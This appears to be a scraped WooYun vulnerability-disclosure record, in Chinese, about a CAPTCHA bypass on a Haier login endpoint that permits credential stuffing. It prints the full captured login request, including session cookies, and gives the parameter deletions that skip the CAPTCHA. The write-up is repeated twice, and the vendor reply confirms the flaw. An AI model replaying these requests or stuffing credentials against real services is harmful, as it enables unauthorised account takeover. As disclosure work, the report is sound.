{"id": 80830, "wybug_id": "wooyun-2015-0155066", "wybug_title": "海尔某登录位置设计缺陷可绕过验证码撞库网站用户", "wybug_corp": "海尔集团", "wybug_author": "路人甲", "wybug_date": "2015-11-23 11:23", "wybug_open_date": "2016-01-11 15:32", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "低", "wybug_rank_0": "3", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感接口缺乏校验"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-11：\t细节向公众公开  简要描述： 海尔某登录位置设计缺陷可绕过验证码撞库网站用户 详细说明：  http://testuser.haier.com/ids/cn/haier_login.jsp?regFrom=WishDiyProj&returnUrl=http%3A%2F%2Fmakerekam.com%2Fcallback%3Fr%3Dhttp%3A%2F%2Fmakerekam.com\n\n这处登录接口位置，一开始没有验证码，错误几次之后就出来了验证码，但是经过测试，验证码可以绕过的，具体绕过如下：抓包数据如下：\nPOST /ids/cn/haier_do_loginajax.jsp HTTP/1.1Host: testuser.haier.comUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:42.0) Gecko/20100101 Firefox/42.0Accept: text/plain, */*; q=0.01Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: http://testuser.haier.com/ids/cn/haier_login.jsp?regFrom=WishDiyProj&returnUrl=http%3A%2F%2Fmakerekam.com%2Fcallback%3Fr%3Dhttp%3A%2F%2Fmakerekam.comContent-Length: 107Cookie: JSESSIONID=FCC6C405642715536868425CD19AB9C9; trsidsssosessionid=6F68C80B4E7162FCFD9160CE432FC314-10.159.63.16; _gscu_1690714239=4818699272bbn213; _gscs_1690714239=48186992gp9rtt13|pv:5; _gscbrs_1690714239=1; _gscu_345248242=481869925phjju13; _gscs_345248242=48186992pb3nee13|pv:5; _gscbrs_345248242=1; _gscu_786492823=481873551f9z3020; _gscs_786492823=481873551njtve20|pv:1; _gscbrs_786492823=1; trsidssdssotoken=CFD221FAB7E56B75915109B81FEC2AB2-10.159.63.77_1448230841656Connection: keep-alivePragma: no-cacheCache-Control: no-cachereturnUrl=%2Fcn&userName=aaa&password=aaaaaaaaaaa&autoLogin=true&cookieTime=0.5&verifyCodes=6759&viplogin=0\n删除：\n&autoLogin=true&cookieTime=0.5&verifyCodes=6759&viplogin=0\n修改为：\nPOST /ids/cn/haier_do_loginajax.jsp HTTP/1.1Host: testuser.haier.comUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:42.0) Gecko/20100101 Firefox/42.0Accept: text/plain, */*; q=0.01Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: http://testuser.haier.com/ids/cn/haier_login.jsp?regFrom=WishDiyProj&returnUrl=http%3A%2F%2Fmakerekam.com%2Fcallback%3Fr%3Dhttp%3A%2F%2Fmakerekam.comContent-Length: 107Cookie: JSESSIONID=FCC6C405642715536868425CD19AB9C9; trsidsssosessionid=6F68C80B4E7162FCFD9160CE432FC314-10.159.63.16; _gscu_1690714239=4818699272bbn213; _gscs_1690714239=48186992gp9rtt13|pv:5; _gscbrs_1690714239=1; _gscu_345248242=481869925phjju13; _gscs_345248242=48186992pb3nee13|pv:5; _gscbrs_345248242=1; _gscu_786492823=481873551f9z3020; _gscs_786492823=481873551njtve20|pv:1; _gscbrs_786492823=1; trsidssdssotoken=CFD221FAB7E56B75915109B81FEC2AB2-10.159.63.77_1448230841656Connection: keep-alivePragma: no-cacheCache-Control: no-cachereturnUrl=%2Fcn&userName=aaa&password=aaaaaaaaaaa\n然后就提示的是你的用户名或者密码好像不对哦！而不是验证码错误类的信息了用户名密码明文传输的：\n\n测试撞库成功，这里出来了一些就停了，证明确实是可以撞库的：\n\n登录帐号证明：\n\n\n\n   漏洞证明：  http://testuser.haier.com/ids/cn/haier_login.jsp?regFrom=WishDiyProj&returnUrl=http%3A%2F%2Fmakerekam.com%2Fcallback%3Fr%3Dhttp%3A%2F%2Fmakerekam.com\n\n这处登录接口位置，一开始没有验证码，错误几次之后就出来了验证码，但是经过测试，验证码可以绕过的，具体绕过如下：抓包数据如下：\nPOST /ids/cn/haier_do_loginajax.jsp HTTP/1.1Host: testuser.haier.comUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:42.0) Gecko/20100101 Firefox/42.0Accept: text/plain, */*; q=0.01Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: http://testuser.haier.com/ids/cn/haier_login.jsp?regFrom=WishDiyProj&returnUrl=http%3A%2F%2Fmakerekam.com%2Fcallback%3Fr%3Dhttp%3A%2F%2Fmakerekam.comContent-Length: 107Cookie: JSESSIONID=FCC6C405642715536868425CD19AB9C9; trsidsssosessionid=6F68C80B4E7162FCFD9160CE432FC314-10.159.63.16; _gscu_1690714239=4818699272bbn213; _gscs_1690714239=48186992gp9rtt13|pv:5; _gscbrs_1690714239=1; _gscu_345248242=481869925phjju13; _gscs_345248242=48186992pb3nee13|pv:5; _gscbrs_345248242=1; _gscu_786492823=481873551f9z3020; _gscs_786492823=481873551njtve20|pv:1; _gscbrs_786492823=1; trsidssdssotoken=CFD221FAB7E56B75915109B81FEC2AB2-10.159.63.77_1448230841656Connection: keep-alivePragma: no-cacheCache-Control: no-cachereturnUrl=%2Fcn&userName=aaa&password=aaaaaaaaaaa&autoLogin=true&cookieTime=0.5&verifyCodes=6759&viplogin=0\n删除：\n&autoLogin=true&cookieTime=0.5&verifyCodes=6759&viplogin=0\n修改为：\nPOST /ids/cn/haier_do_loginajax.jsp HTTP/1.1Host: testuser.haier.comUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:42.0) Gecko/20100101 Firefox/42.0Accept: text/plain, */*; q=0.01Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: http://testuser.haier.com/ids/cn/haier_login.jsp?regFrom=WishDiyProj&returnUrl=http%3A%2F%2Fmakerekam.com%2Fcallback%3Fr%3Dhttp%3A%2F%2Fmakerekam.comContent-Length: 107Cookie: JSESSIONID=FCC6C405642715536868425CD19AB9C9; trsidsssosessionid=6F68C80B4E7162FCFD9160CE432FC314-10.159.63.16; _gscu_1690714239=4818699272bbn213; _gscs_1690714239=48186992gp9rtt13|pv:5; _gscbrs_1690714239=1; _gscu_345248242=481869925phjju13; _gscs_345248242=48186992pb3nee13|pv:5; _gscbrs_345248242=1; _gscu_786492823=481873551f9z3020; _gscs_786492823=481873551njtve20|pv:1; _gscbrs_786492823=1; trsidssdssotoken=CFD221FAB7E56B75915109B81FEC2AB2-10.159.63.77_1448230841656Connection: keep-alivePragma: no-cacheCache-Control: no-cachereturnUrl=%2Fcn&userName=aaa&password=aaaaaaaaaaa\n然后就提示的是你的用户名或者密码好像不对哦！而不是验证码错误类的信息了用户名密码明文传输的：\n\n测试撞库成功，这里出来了一些就停了，证明确实是可以撞库的：\n\n登录帐号证明：\n\n\n\n   修复方案：  验证码修复   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2015-11-24 13:33 厂商回复： 感谢乌云平台白帽子的测试与提醒，我方已安排人员进行处理 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}